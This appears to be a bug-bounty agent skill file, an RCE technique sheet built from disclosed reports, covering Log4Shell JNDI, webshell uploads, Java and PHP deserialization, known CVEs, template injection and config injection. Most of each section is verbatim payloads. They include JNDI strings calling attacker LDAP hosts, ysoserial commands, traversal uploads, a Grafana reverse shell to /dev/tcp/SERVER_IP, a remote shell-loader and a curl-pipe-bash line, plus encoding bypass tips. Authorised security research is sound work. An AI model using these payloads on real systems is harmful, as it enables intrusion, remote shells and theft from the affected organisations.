---
name: hunter-l3-rce
description: "Use when hunting RCE on a target. Loads the L3 technique sheet: This class covers any path to arbitrary code or command execution on a target system: web shells via unrestricted uploads, deserialization gadgets, template/expression injection, known-CVE exploitatio"
domain: cybersecurity
subdomain: web
tags:
- web
- rce
- hunting
- l3
version: '1.0'
---

# RCE — Technique Sheet

## Overview
This class covers any path to arbitrary code or command execution on a target system: web shells via unrestricted uploads, deserialization gadgets, template/expression injection, known-CVE exploitation of exposed admin surfaces, JNDI lookup abuse, and OS-handler/Electron abuse in desktop apps. It pays at the top of every severity scale — most records here were CVSS 9-10 or critical-flagged — and programs (including DoD) confirm and pay quickly when a command (whoami, id) provably runs. RCE is rarely a single bug: most confirmed chains combine a foothold (upload, config write, exposed console) with an execution primitive (PHP eval, Java gadget, JVM agent, shell handler).

## Distinct sub-patterns

### 1. JNDI injection (Log4Shell / JAAS) in headers, params, and config
- Endpoint/param: any logged input — POST username field (id=1438393), HTTP headers User-Agent / X-Forwarded-For / Referer (id=1459714), and Kafka Connect connector config `database.history.producer.sasl.jaas.config` (id=1529790).
- Payload (verbatim): `${jndi:ldap://dns-server-yoi-control/a}`; `${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}`; JAAS variant: `com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";`
- Root cause: vulnerable Log4j evaluates JNDI lookups in logged, attacker-controlled strings; JAAS config accepts attacker-supplied LDAP URLs causing deserialization of attacker data.
- Impact: OOB DNS/LDAP callbacks (one leaked the internal hostname ng01-cloud-elk-ls-vm01), escalating to full RCE; the Kafka Connect case yielded a reverse shell via a CommonsCollections7 gadget.
- Exemplars: 1438393 (DoD), 1459714 (Acronis), 1529790 (Aiven).

### 2. Unrestricted file upload → webshell
- Endpoint/param shapes: POST /api/actions/fileUpload.php `image_file` (id=158148); POST /v1/backend1 `account_name`,`data` (id=1356845); POST /repo/orbital/repo.asp `myfile` (id=2054184); SCORM zip upload `imsmanifest.xml` referencing an ASPX (id=1122791); ExpressionEngine channel-import zip (id=236607); Extract app `nameOfFile`/`directory` (id=765291).
- Payloads: extension bypasses — `.php` preserved with a PHP shell that survived 50x50 image resize (158148); traversal + content: `account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>` (1356845); null byte `poc.asp.png` with a WSCRIPT.SHELL ASP webshell (2054184); `shared/cdlcdlcdl.aspx` embedded in a SCORM 2004 zip (1122791); zip path traversal `nameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib` overwriting apps/files/App.php (765291).
- Root cause: extension/suffix-only validation, missing zip-entry path validation, and no type restriction on extracted archives.
- Impact: `?cmd=`/`?c=id` webshells running whoami/dir as www-data/apache on production and military servers.
- Exemplars: 2054184, 1122791, 765291.

### 3. Exposed admin/developer consoles without authentication
- Endpoint shapes: Jenkins `/script` or `/_script` Groovy console (ids 1125329, 1492447); Portainer on :9000 with no admin configured (id=1332433).
- Payloads: Groovy `println "ls".execute().text` / `println "whoami".execute().text`; Portainer default `admin:password`.
- Root cause: management surfaces (Groovy script console, Docker control plane) exposed unauthenticated — the console itself is a by-design execution engine.
- Impact: immediate command execution (ls, whoami confirmed on video); Portainer gave bash on 17 containers including prod Postgres plus disclosure of internal IPs, volumes, and stacks.
- Exemplars: 1125329, 1492447, 1332433.

### 4. Unsafe deserialization (Java, PHP, Ruby, YAML)
- Endpoint/param shapes: POST /invoker/EJBInvokerServlet and /invoker/JMXInvokerServlet, Java serialized body (id=153026); base64 ysoserial blob in request to an OpenAM/Jato endpoint (id=1249456); `mybb[forumread]` cookie (id=198733); Rails `_facebook-search_session` cookie + leaked secret (id=134321); PHP object injection post-auth in control panel (id=1820492); `.rdoc_options` YAML (id=2438265); unauthenticated JMX on port 555 (id=1456064→1456063).
- Payloads (verbatim where given): `java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net"`; ysoserial CommonsCollections1 binary (commands: cmd.exe, fakefile.exe, telnet, calc.exe); MyBB GMP type-confusion cookie: `a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12:"DateInterval":1:{s:1:"y"%3bR:2%3b}}}}`.
- Root cause: deserializing untrusted objects without class filtering; eval'd template cache overwritten via GMP type confusion; signed-cookie RCE when the Rails secret is public (committed to GitHub, found with gitrob).
- Impact: OOB Collaborator hit proving pre-auth RCE; Windows command execution confirmed via fakefile.exe's "The system cannot find the file specified" error; single-curl phpinfo() on MyBB; reverse shell as uid=1000(prod).
- Exemplars: 1249456, 153026, 198733, 134321.

### 5. Known-CVE exploitation of exposed enterprise/vintage software
- Endpoint shapes: POST /Kview/.../scorm2004uploadcourse.aspx (Drupalgeddon2, CVE-2018-7600, id=1063256); POST /{redacted}/Telerik.Web.UI.WebResource.axd?type=rau (CVE-2017-11317/2019-18935, id=1174185); GET /tmui/locallb/workspace/fileRead.jsp with `/..;` traversal (F5 CVE-2020-5902, ids 2794126, 1519841); POST /_ignition/execute-solution (Laravel CVE-2021-3129, id=2765259); Sitecore sitecore_xaml.ashx ParseControl injection (CVE-2023-35813, id=2200329); Cisco webui_wsma_http (CVE-2023-20198/20273, id=2778350); Apache CGI path traversal (CVE-2021-41773 family, id=1404731); mod_rewrite flaws (CVE-2024-38474/38475, ids 2585378, 2585381); XXE→RCE (CVE-2017-3548, id=232330); Vaultpress signature bypass (id=236552); Airflow hooks (ids 1891795, 1895277, 1895316, 2065288, 2065306).
- Payloads: `ruby drupalgeddon2-customizable-beta.rb -u https://www.███/ -v 7 -c id --form user/login` (returned `uid=48(apache)`); Ignition: `{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"viewFile": "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}`; Apache CGI: `POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh` with `echo Content-Type: text/plain; echo; id; uname;apache2ctl -M` in the body; Sitecore: `<asp:TextBox runat="server" OnDataBinding="System.Diagnostics.Process.Start(&quot;/bin/sh&quot;,&quot;-c id&quot;)" />`; Airflow extras: `"sql_proxy_version":"../swordlight/system?a="`, `"sql_proxy_version":"?a=", "sql_proxy_binary_path":"whoami"`, malicious JDBC Driver class (static block runs `whoami`), ODBC `driver` extra → `system('touch /tmp/apache-ariflow-odbc')`.
- Root cause: outdated/unpatched components with pre-auth execution paths; `%%32%65` double-encoding bypassed the path-traversal fix to reach CGI /bin/sh.
- Impact: whoami/id as apache on DoD hosts; full privilege-15 Cisco user creation and root escalation with running-config (enable secret) disclosure; unauthenticated Laravel RCE; F5 file read.
- Exemplars: 1404731, 2765259, 2778350, 1063256.

### 6. Template / expression / markup injection
- Endpoint shapes: GitLab wiki `.rmd` kramdown inline options (id=1125425); ownCloud ImageMagick MSL/SVG preview (id=1838674); ImageTragick coders (id=143966); Simplenote Electron Markdown preview (id=291539).
- Payloads: kramdown `{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\}" /}` (formatter init requires and evals an attacker-placed .rb); MSL writing `<?php echo php_uname(); ?>` to /var/www/owncloud/index.php via `<write filename=...>`; Simplenote `<img src=x onerror=eval(String.fromCharCode(...))>` in a Node-enabled preview with no CSP.
- Root cause: renderers accepting dangerous inline options/markup (formatter driver = arbitrary file require; ImageMagick processing MSL without sandbox; Electron preview with nodeIntegration and no CSP).
- Impact: Ruby execution on GitLab writing /tmp/vakzz; PHP write + execution on ownCloud; cmd.exe launched from a note preview.
- Exemplars: 1125425, 1838674, 291539.

### 7. Config / parameter injection into execution engines
- Endpoint shapes: Aiven Grafana `user_config.smtp_server.password` via PUT /v1/project/{project}/service/{service} (id=1200647); Aiven Flink GET /jars/{jar_id}/plan `entry-class`/`programArg` (id=1418891); Kafka Connect → Jolokia `jvmtiAgentLoad` (id=1547877); Airflow `-libjars` in Sqoop hook (id=1891795).
- Payloads: `x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1` (CRLF in SMTP password injects an unexported Grafana config section); `entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://.../shell-loader.js")&parallelism=1` (loads an arbitrary class with attacker args); crafted SQLite DB with a JVM agent JAR embedded as BLOB, then `jvmtiAgentLoad` on unprotected localhost:6725 Jolokia.
- Root cause: user-controlled config values reach command lines, class loaders, or JVM agents without validation; CRLF smuggles config keys that are normally not exported.
- Impact: reverse shells on Grafana, Flink, and Kafka Connect servers with internal network pivot.
- Exemplars: 1200647, 1418891, 1547877.

### 8. Desktop / client-side execution (Electron, OS handlers, quarantine, supply chain)
- Endpoint shapes: Basecamp Electron attachment download with attacker subdomain (id=1016966, payload `http://launchpad.dev.{domain}/file.exe?attachment=true` served as text/calendar); HEY macOS `.terminal` attachment without com.apple.quarantine (id=1019389, payload a .terminal plist running `curl -Ls https://git.io/vXd2N | bash`); Nextcloud Desktop WebView arbitrary URI schemes (id=1078002, payload `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/`); Rocket.Chat `openInternalVideoChatWindow` → shell.openExternal() (id=1781102); Steam Deck CEF v8 exploit chained to root LPE (id=1974296); snapcraft empty LD_LIBRARY_PATH entries loading attacker libc from CWD (id=1073202); Basecamp CI gem fallback installing attacker's higher-version `okra` gem from rubygems (id=1104874); Imgur GHE static Rails secret (id=206227).
- Root cause: regex-bypassable internal-host checks, missing quarantine attributes, unallowlisted URI schemes, library paths resolving to CWD, and dependency-resolution fallbacks — client trust boundaries defeated.
- Impact: one-click shell on victim machines, calc.exe via WinSCP proxy command, root on Steam Deck, code execution inside Basecamp's internal build host.
- Exemplars: 1016966, 1019389, 1078002, 1073202.

### 9. Second-order / hybrid webshells via file-move and .htaccess
- Endpoint shape: Nextcloud federated share moved into webroot-exposed data dir (id=228825): payload `attack.php` + `.htaccess` with `allow from all`, executed at `http://nc2/data/userid/files/attack/attack.php`.
- Root cause: Storage::copyFromStorage ignores the file blacklist, letting .htaccess + PHP cross from an external share into the Apache webroot.
- Impact: authenticated attacker runs arbitrary PHP on the victim instance. Also Krisp: unauthenticated SQLi in /wp-json/tenwebio/v2/compress-one chained into insecure deserialization → RCE, CVSS 10.0 (id=1842674); Elastic headless-Chromium reporting with --no-sandbox exploited via attacker HTML (id=1168765).
- Exemplars: 228825, 1842674.

## Bypass / chain notes
- Encoding bypasses: `%%32%65` (=.) for Apache CGI traversal (1404731); `/..;/` for F5 TMUI (2794126); null byte `poc.asp.png` for suffix-only filters (2054184); attacker subdomain matching a host regex (`launchpad.dev.attacker.com`) (1016966).
- Multi-step chains dominate: upload→traversal→webshell (1356845); XSS→exposed Electron API→shell.openExternal (1781102); SQLi→deserialization (1842674); Nginx path-validation bypass→unauth WSMA→priv-15 user→root (2778350); v8 in CEF→file write→LPE→root (1974296); JDBC sink SQLite upload→Jolokia jvmtiAgentLoad→shell (1547877).
- `$IFS` instead of spaces in reverse-shell commands inside config values (1200647) — spaces often break parsers.
- Use `${hostName}` inside the JNDI payload to exfiltrate the server's identity in the OOB callback (1459714).
- For deserialization on Windows, distinguish execution from error: run a nonexistent binary and cite the "The system cannot find the file specified" response (153026).
- Place an exploit file at a known path (snippet attachment, uploads dir) before referencing it from a second injection (GitLab kramdown needs a reachable .rb, 1125425).

## Gotchas / what NOT to do
- Don't stop at file upload confirmation: Telerik RAU (1174185) was filed with upload proven but deserialization-RCE unconfirmed — proving the file write alone may cap severity or trigger a request for more.
- OOB callbacks (DNS/LDAP/Collaborator) prove lookup but reviewers may want command output; pair with a benign executed command where possible (`id`, `whoami`, `touch /tmp/marker` — used across 1895277/1895316/2065288/2065306).
- Don't assume the exploit works unauthenticated: ExpressionEngine PHP object injection required control-panel permissions (1820492); Nextcloud .htaccess chain required an authenticated share (228825). State the auth prerequisite.
- Reporting-only headless browsers may not be a full chain by themselves — the Elastic --no-sandbox Chrome RCE was demonstrated but explicitly noted as lacking a full delivery chain (1168765).
- Don't run destructive payloads: the records use whoami, id, dir, phpinfo, touch, and file-writes like /tmp/hello — nothing worse.
- Don't test known CVEs on undisclosed pages blindly; 8x8's CVE-2020-5902 was confirmed with the fix/restriction applied (1519841) — check scope and use minimal PoCs.

## Real-world impact examples
- DoD military server: SCORM-packaged ASPX shell ran whoami after upload (1122791); Drupalgeddon2 returned `uid=48(apache) gid=48(apache) ... httpd_t` and /etc/passwd (1063256).
- Aiven: three separate reverse shells — Grafana via CRLF-injected renderer args (1200647), Flink via arbitrary entry-class load (1418891), Kafka Connect via SQLite-embedded JVM agent through Jolokia (1547877) — each enabling internal network pivot.
- Cisco (MTN): full running-config with enable secret and SNMP credentials read, privilege-15 user created, root on the underlying Linux (2778350).
- Basecamp: internal build host ran the attacker's rubygems `okra` gem as user `fernando` (1104874); HEY macOS `.terminal` attachment gave a reverse shell with zero Gatekeeper warnings (1019389).
- Nextcloud Extract app: overwrote apps/files/App.php, ran whoami as www-data, exposing all files and PII (765291); exposed Portainer gave command execution on 17 containers including production (1332433).
- Krisp: unauthenticated SQLi→deserialization RCE on the main site, CVSS 10.0, confirmed by vendor and Wordfence (1842674).